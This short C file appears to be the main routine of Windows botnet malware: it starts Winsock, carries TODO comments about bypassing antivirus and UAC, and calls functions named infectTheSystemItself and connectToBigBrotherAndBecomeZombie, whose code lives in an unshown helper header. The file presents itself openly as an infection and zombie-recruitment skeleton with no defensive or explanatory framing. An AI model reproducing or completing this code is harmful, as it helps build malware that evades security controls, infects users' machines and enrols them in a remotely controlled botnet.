#include <windows.h>
#include "helper.h"

int main()	// gcc --machine-windows
{
	WSADATA _wsdata;

	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
	{
		Sleep(500);
	}

	//TODO: ByPass AV
	//TODO: ByPass UAC

	infectTheSystemItself();
	connectToBigBrotherAndBecomeZombie();

	WSACleanup();

	return 0;
}
